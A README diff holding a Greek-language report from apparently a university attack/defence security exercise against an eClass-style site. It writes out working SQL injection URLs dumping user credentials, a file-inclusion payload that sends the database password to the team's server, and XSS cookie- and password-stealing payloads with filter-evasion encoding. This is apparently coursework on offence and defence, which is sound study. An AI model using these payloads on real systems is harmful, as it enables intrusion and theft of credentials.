@@ -18,6 +18,162 @@
 
 ### Report
 
+Συμπληρώστε εδώ __ένα report__ που
+- Να εξηγεί τι είδους αλλαγές κάνατε στον κώδικα για να προστατέψετε το site σας (από την κάθε επίθεση).
+- Να εξηγεί τι είδους επιθέσεις δοκιμάσατε στο αντίπαλο site και αν αυτές πέτυχαν.
+
+## Defacement (Target: hackerz.csec.chatzi.org)\
+
+### Grant Admin Access\
+
+#### -> 1ος Τρόπος (Επιτυχής)
+- Οι πρώτες επιθέσεις που δοκιμάσαμε ήταν να κάνουμε ___SQL Injection___ και να πάρουμε τους κωδικούς από τη βάση. \
+Δοκιμάσαμε αρχικά στη σελίδα ___contactadmin.php___ η οποία επέστρεψε επιτυχώς τα αποτελέσματα που ανανμέναμε.
+
+   _Με το παρακάτω url_:
+   > http://hackerz.csec.chatzi.org/modules/auth/contactadmin.php?userid=1' union select 1,group_concat(0x3c62723e,user_id,0x3a,0x3a,nom,0x3a,0x3a,prenom,0x3a,0x3a,username,0x3a,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from user-- -
+  
+   Παίρνουμε όλα τα δεδομένα των users από τη βάση μαζί με τους hashed κωδικούς τους.\
+   Ενδεικτικά το hash του κωδικού του drunkadmin είναι: __63d786jrfu5l33b3jc59aq7s32__
+   
+  
+- Στη συνέχεια φτιάξαμε χρήστη και δοκιμάσαμε αν μπορούμε να ανεβάσουμε αρχείο __.php__. Το ανέβασμα έγινε με επιτυχία \
+  και αρχίσαμε να σκεφτόμαστε τρόπους να το εκμεταλλευτούμε αυτό με κάποιο __RFI/LFI__. Τελικά βρήκαμε ένα σημείο στο \
+  οποίο υπήρχε ένα εξίσου μεγάλο κενό, από το οποίο μπορέσαμε να εκτελέσουμε το php μας.
+
+   _Με το παρακάτω url_:
+   > http://hackerz.csec.chatzi.org/modules/admin/sysinfo/index.php?lng=../../../../../<path to php\>
+  
+   μπορούμε να εκτελέσουμε οποιοδήποτε php file υπάρχει μέσα στο server. Η μεταβλητή $lng δεν αρχικοποιείται μέσα στο \
+   αρχείο sysinfo/index.php και μπορεί να δοθεί από το url οπιαδήποτε τιμή θέλουμε. \
+   Εκτελείται η ακόλουθη εντολή μέσα στο sysinfo/index.php: \
+   
+   `require('./includes/lang/' . $lng . '.php');` \
+   
+   από την οποία εμφανώς μπορεί να δοθεί ένα οποιοδήποτε μονοπάτι προς κάποιο php και να εκτελεστεί χωρίς κανέναν έλεγχο.
+   
+   Με αυτόν τον τρόπο καταφέραμε να υποκλέψουμε τα δεδομένα του αρχείου config.php και να πάρουμε σε _plain text_ τον κωδικό \
+   της βάσης και του drunkadmin (_δεδομένου ότι είναι ο ίδιος_) και πήραμε admin access!
+   
+   Το περιεχόμενο του php file που χρησιμοποιήθηκε ήταν το παρακάτω:\
+   `require('../../../config/config.php');` \
+   `header('Location: http://cybergh0sts.csec.chatzi.org/index.php?passwd='. $mysqlPassword);`
+   
+   Ουσιαστικά φόρτωνε το config.php και έκανε ανακατέυθυνση στη δικιά μας σελίδα δίνοντας τον κωδικό σαν κάποια μεταβλητή \
+   ___passwd___ την οποία πήραμε από τα logs του server μας.
+   
+
+#### -> 2ος Τρόπος (Επιτυχής)
+- Ένας ακόμα τρόπος με τον οποίο καταφέραμε να πάρουμε __admin access__, είναι μέσω υποκλοπής του cookie του drunkadmin. \
+  Οι αντίπαλοι μας δεν είχαν χρησιμοποιήσει το ___HTTP Only___ ώστε να απαγορεύει πρόσβαση του cookie από τη JavaScript \
+  και με έναν συνδυασμό __CSRF__ & __XSS__ που εκμεταλλευτήκαμε καταφέραμε να πάρουμε το cookie.
+  
+  Το __XSS__ βρίσκεται στη σελίδα: ___agenda.php___
+  
+  Με χρήση του παρακάτω κώδικα στη σελίδα μας cybergh0sts.puppies.chatzi.org καταφέραμε να πάρουμε τις πληροφορίες που θέλουμε: \
+  `<iframe width="0" height="0" style="visibility: hidden;" src='http://hackerz.csec.chatzi.org/modules/agenda/myagenda.php?month=6&year=2020<script>window.location.href = "http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallen=".concat(document.cookie);</script>'></iframe>`
+   
+   Με το παραπάνω __iframe__, το οποίο ήταν hidden, εκτελούσαμε το __XSS__ το οποίο το ανακατεύθυνε στη δικιά μας σελίδα και \
+   ενσωμάτωνε στο URL το cookie του drunkadmin και το παίρναμε εμείς από τα logs του server μας.
+   
+   Στη συνέχεια, επειδή θα έπρεπε να κρατήσουμε το browser session ενεργό προκειμένου να μη χάσουμε τη πρόσβαση μέσω του cookie \
+   θα πηγαίναμε στη σελίδα: ___eclassconf.php___ η οποία είναι η σελίδα στην οποια υπάρχει η φόρμα αλλαγής των στοιχείων πρόσβασης \
+   στη βάση. Έτσι παρόλο που το πεδίο του κωδικού ήταν κρυμμένο, με ένα απλό Inspect Element μπορούσαμε να δούμε το attribute: _value_ \
+   της φόρμας στο πεδίο του password και να βρούμε άμεσα τον κωδικό της βάσης, που εν προκειμένω ήταν και ίδιος με του drunkadmin.
+   
+
+#### -> 3ος Τρόπος (Ασφαλισμένο, αλλά έχει δοκιμαστεί σε unpatched version και λειτουργεί)
+- Ένα πολύ ενδιαφέρον attack μέσω πάλι ενός συνδυασμού __CSRF__ & __XSS__, βρίσκεται στη σελίδα ___eclassconf.php___.\
+  Σε αυτήν τη σελίδα, όπως περιγράφηκε στο προηγούμενο attack, υπάρχει ο κωδικός της βάσης στο attribute _value_ στο \
+  πεδίο της φόρμας για τον κωδικό.
+  
+  Το __XSS__ σε αυτήν τη σελίδα εντοπίζεται στα σημεία που γίνεται \_POST και \_GET. Έτσι, αν βάλουμε στο URL ενα '/">' στο \
+  μετά το .php, θα χαλάσει η μορφοποίηση της σελίδας και θα κάνει embed δίπλα από τα attrinutes _method="get"_ και _method="post"_
+  οτιδήποτε γράψουμε μετά το '/">'.
+  
+  Για παράδειγμα γράφοντας:
+  > http://hackerz.csec.chatzi.org/modules/admin/eclassconf.php/"><script\>alert('You have been H4cked')<script\>
+  
+  Εκτελείται το __XSS__ κανονικά, γιατί ουσιαστικά κλείνουμε το <form action="...php/"> method="post"> </form> και κάνουμε το \
+  υπόλοιπο ___payload___ που δίνουμε να ενσωματωθεί κανονικά στον κώδικα και να εκτελεστεί.
+  
+  
+  Έτσι κατασκευάσαμε το παρακάτω ___payload___:\
+  `<script>document.ready(document.body.insertAdjacentHTML('afterend', <img src="image_url" alt="" onload="window.location.href='http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallenAgain_Password='.concat(document.getElementsByName('formmysqlPassword')[0].getAttribute('value'))"/>))</script>`
+  
+  Δοκιμάστηκε η χρήση διπλού εμφωλευένου <script> στη θέση του <img/> το οποίο έγινε επιτυχώς embed στον κώδικα της σελίδας όπως \
+  θέλαμε, αλλά δεν εκτελούνταν εξαιτίας της χρήσης του function, __document.body.insertAdjacentHTML__ το οποίο δεν εκτελεί \
+  τον κώδικα που ενσωματώνει. Έτσι για να ξεπεραστεί αυτό το εμπόδιο έγινε η χρήση του <img/>.
+  
+  Με αυτόν τον τρόπο, μόλις φορτωθεί η εικόνα θα εκτελέσει το script που έχουμε ενσωματώσει μέσα και με τον ίδιο τρόπο που \
+  περιγράφηκε για την agenda, θα ανακατευθύνει στο δικό μας site τις πληροφορίες που θέλουμε, οι οποίες είναι το ___username___ και \
+  το ___password___ διαβάζοντας τον HTML κώδικα.
+  
+  Ωστόσο, υπήρχαν προβλήματα κωδικοποίησης, επειδή στη θέση που βάζουμε το <img/> γίνονται escape πολλοί από τους χαρακτήρες. \
+  Έτσι, ξεπεράσαμε και αυτό το πρόβλημα μέσω της χρήσης του __''.concat(String.fromCharCode(ASCII NUMBER))__ το οποίο κωδικοποιεί \
+  κάθε μη επιτρεπτό χαρακτήρα και εκτελεί τη συνάρτηση αποκωδικοποίησης παρακάμπτοντας κάθε έλεγχο invalid χαρακτήρων των αντιπάλων. \
+  
+  Τέλος, επειδή κάποιοι χαρακτήρες συνέχιζαν να αποκόπτωνται μετατρέψαμε όλο το payload του URL σε URL Encoded μορφή. \
+  Έτσι, καθ'αυτόν τον τρόπο φτιάξαμε το παρακάτω paylaod το οποίο έκανε όλη τη δουλειά κωδικοποιημένα:
+  
+  - __Χωρίς Κωδικοποίηση__
+  > http://192.168.1.12/modules/admin/eclassconf.php/"><script>document.ready(document.body.insertAdjacentHTML('afterend', <img src="image_url" alt="" onload="window.location.href='http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallenAgain_Password='.concat(document.getElementsByName('formmysqlPassword')[0].getAttribute('value'))"/>))</script>
+  
+  - __1ο Στάδιο Κωδικοποίησης (_Ιδιαίτερα μεγάλο URL και παρατίθεται ένας μέρος του_)__
+  > http://192.168.1.12/modules/admin/eclassconf.php/"><script>document.ready(document.body.insertAdjacentHTML('afterend', ''.concat(String.fromCharCode(60)).concat('img').concat(String.fromCharCode(32)).concat('src').concat(String.fromCharCode(61))  ...  ))</script>
+  
+  - __2ο Στάδιο Κωδικοποίησης (_Εξαιρετικά μεγάλο URL, φτάνει το όριο επιτρεπτού URL length και παρατίθεται ένας μέρος του_)__
+    > http://192.168.1.12/modules/admin/eclassconf.php/%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%72%65%61%64%79%28%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%69%6e%73%65%72%74%41%64%6a%61%63%65%6e%74%48%54%4d%4c%28%27  ...  /  ...  
+  
+
+
+
+
+## Κενά Ασφαλείας και Επιθέσεις
+
+  - __SQL Injections__
+       
+       Κατά τη διάρκεια της φάσης του defence, σκεφτήκαμε να βρούμε από όσο πιο πολλά αρχεία γίνεται σημεία \
+       στα οποία χρησιμοποιούνται μεταβλητές οι οποίες είτε δεν έχουν αρχικοποιηθεί, είτε μπορεί να παρακμφθεί \
+       η αρχικοποίηση τους και στη συνέχεια γίνεται χρήση αυτής σε κάποιο SQL Query.
+       
+       Έτσι, με τροποποίηση του url request δίνουμε στη συγκεκριμένη μεταβλητή μια τιμή που θέλουμε εμείς έτσι \
+       ώστε να σπάσουμε το SQL Query και να το κάνουμε να επιστρέψει τα αποτελέσματα που θέλουμε.
+       
+       Με αυτό το σκεπτικό έγιναν πάνω κάτω όλες οι επιθέσεις για __SQL Injection__
+       
+       
+       - Στη σελίδα __/modules/auth/contactadmin.php__ υπάρχει ένα σημαντικό κενό από το οποίο μπορούμε \
+       να αντλήσουμε όλα τα δεδομένα της βάσης.
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+Απόκτηση δικαιωμάτων διαχειριστή
+
+cookie stealer -> Αρχικά εντοπίσαμε ένα κενό στο modules/agenda/myagenda.php στο οποίο
+μπορούσαμε να κάνουμε xss προσθέτοντας το ?month=6&year=2020<script>xss</script> στο URL
+έπειτα φτιάξαμε ένα script που κλέβει το cookie και κάνει ένα request στον server του 
+online vm μας καλώντας το παρακάτω
+http://hackerz.csec.chatzi.org/modules/agenda/myagenda.php
+?month=6&year=2020<script>window.location.href = "http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallen=".concat(document.cookie);</script>
+Έπειτα τον ενσωματώσαμε σε ένα iframe που ήταν hidden , φτιάξαμε μια σελίδα στο puppies και βάλαμε το iframe μέσα . 
+Τέλος στείλαμε email στον drunk admin , ο οποίος ανοίγοντάς το ουσιαστικά μας έδωσε το cookie του . 
+
+rfi -> Αρχικά εντοπίσαμε ένα κενό στο /modules/admin/sysinfo/index.php στο οποίο μπορούμε 
+να κάνουμε rfi κάποιου αρχείου αν προσθέσουμε ?lng=(path κάποιου αρχείου) στο τέλος του URL .
+Έτσι φτιάξαμε ένα php το οποίο κάνει require το config.php κανει έπειτα παίρνει την μεταβλητή
+$mysqlPassword και κάνει request στον server του online vm μας δηλαδή http://cybergh0sts.csec.chatzi.org/index.php?pass=$mysqlPassword
+Έτσι αποκτήσαμε τον κωδικό του διαχειριστή και με αυτόν , πρόσβαση στον διαχειριστή .
+
+
 Άμυνες :
 
 Άμυνες από την πλευρά του server :
@@ -125,4 +281,7 @@ if ($_REQUEST['token'] != $_SESSION['tok']){
 	die;
 }
 ```
-- Να εξηγεί τι είδους επιθέσεις δοκιμάσατε στο αντίπαλο site και αν αυτές πέτυχαν.
+       
+       
+       
+       
